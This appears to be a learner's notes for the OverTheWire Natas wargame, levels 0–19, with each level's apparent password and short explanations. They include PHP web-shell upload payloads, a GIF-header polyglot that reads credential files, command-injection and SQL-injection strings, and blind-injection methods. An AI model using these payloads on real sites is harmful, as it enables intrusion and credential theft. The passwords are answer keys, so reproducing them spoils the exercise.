#### l1. 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
basic f12 trick
`curl.exe -u natas0:natas0 http://natas0.natas.labs.overthewire.org` to avoid powershell's trap\

#### l2. TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI 
意味不明な\

#### l3. 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
文件路径还真是一个值得看看的地方，比如图在/files/img.img\
那就可以看看/files，类似bandit

#### l4. natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth
robots.txt, when good bot like googleCrawler read this, it just ignores that\
this is not a firewall, edge/chrome browser dont read that\
The folder /s3cr3t/ was "hidden" from you simply because there were no buttons or links pointing to it on the main page.\
browser are simple directly tool, only view where links put to\
to get directories, gobuster is the way\


#### l5. natas5:e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
the oldest way of verification: header's referrer;
`curl.exe -u natas4:[PASSWORD] -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/`
to change referrer\
curl not like browser's "edit and resend", don't care any rule so modify header are viable

#### l6. natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT
HTTP are stateless protocol\
visit a website for the first time, the server gives your browser a tiny text file (a Cookie) that says something like user_role=guest.\
cookies maybe the key. 
`devTool->application->cookie`
`curl.exe -u natas5:[PASSWORD] -b "cookie_name=cookie_value" http://natas5.natas.labs.overthewire.org/`
or a cookie editor can do the trick
`curl.exe -u natas5:[PASSWORD] -b "cookie_name=cookie_value" http://natas5.natas.labs.overthewire.org/`


#### l7.B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0
<?...?> are for php\
server side language\
Developers often put sensitive configuration files (like .inc or .env or .bak) on the web server, \
forgetting that anyone can just type the URL and download them\
include "includes/secret.inc", this is the way\
`in php
/var/www/html/index.php if it's mainpage's loc
include "includes/secret.inc",is a Relative Path. file must be physically located at /var/www/html/includes/secret.inc.
` 
but point is:\
.bak、.swp、.inc \
those temp file, not .php, often unconsiously saved in server, could be read, not like .php, apache server refuse to give raw data, \
apache will run and give return value.

#### l8.ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc
meaningless, most php have a 
`$allowed_pages = ['home', 'about', 'contact', 'services'];` to avoid pathTraversal attack

#### l9.UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9

#### l10.EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv
php's passthu(), similar to exec(),\
use ; to divide commands\

#### l11.VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd
filter like preg_match(), not worth to spend tomuch\
grep, \
`grep PATTERN FILE` is the key\
`grep . /etc/natas_webpass/natas11`\
. means "any character" \

#### l12.EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng
1. xor's key's length are fixed, it can't be fit for all input to met input ^ key = encrypted.\
but key = encrypted ^ input, and get a repeated key, to know the length or "real key"\
but The repeating key is: kBSwkBSwkBSwkBSwkBSwkBSwkBZ{GvF"R) this is what i got when cal the key.\

2. we want cal the cookies to input, by input = b64Encode(xor（jsonEncode(desiredText), key))\
and for the key's length didnt match exactly we want\
( i think we could reduce bgcolor's length by 1 to get same answer， to not guess key's length to avoid second php script)

3. b64 and php's main usage is some text are not humanReadable but computer storable or dealable? so store as data, then use b64 to handle
more to see natas11-12's php script
4. XOR have switch, A^B = B^A, based

#### l13. g8ba0olAzaSJuyS4gnmbdVVigAICLG1k
##### remember in l7, said server refuse to give raw php source code?
upload a php then access it\

1.by given code, this level dont have ext checker
2.it's rename a file like /upload/randomName.ext
3.this ext are get from \
`$_POST["filename"]`\
and this variable "filename" are:\
`<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />`
so change this to .php all things will be fine\
php:
```
<?php
$file = '/etc/natas_webpass/natas13';
readfile($file);
?>
```
#### l14.A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
this level are ass\
exif_imagetype only read first 1 byte to determin what type of a file
```
A GIF always starts with: 47 49 46 38 39 61
GIF89a is it's ascii
put it on first line of php
done
```
polyglot way, hide php embedded code inside of img\
php just dont care it just fine <?php ?> to run\
`<?php system('cat /etc/natas_webpass/natas14'); ?>`

#### l15.GB6USCJYJjwLyYhZUNkE1NwDueiTow6g
base sqlInjectiong ` “ OR 1=1 -- ` to get a false OR ture commmentize to ignore\
```
? in a url are for query string
?debug are for GET("debug")
<input type="hidden" name="debug" value="1"> in F12, but just typing ?debug in the URL is much faster
```

#### [script] blind oracle l16.Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb
Boolean-Based Blind SQL Injection\
do a script to blur guess 52 alphabet in lower/upperCase;\
`natas16" AND password LIKE "a%" -- `\ but force database to enable CASE-sensitive\
`natas16" AND password LIKE BINARY "a%" -- `\
and see return context\
check the script

#### [script] blind oracle l17.KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx
`grep ^x /natas_webpass/natas17`\
to use regex search\
`$()` to run bash command insides of ""\
`grep "xxx" dictionary.txt` only have output when it matched\
`grep password"xxx" dict.txt` will show nothing, so this is the way\
`$(grep ^{guess} /etc/natas_webpass/natas17)Africans`
About single test, could ask ai for curl -u user:psw syntax or\
`F12-network-sumbit-copy curl(bash)`\

#### [scricpt] l18.fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op
time relate blind inject\
most of website response identical context even in different result\
manually time delay when query success is the key\
should always do a double check and prolong the timeout when time delay blind inject\

#### [script] l19.qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT
sequential cookie, just remember to `s.cookies.clear()` before get.\
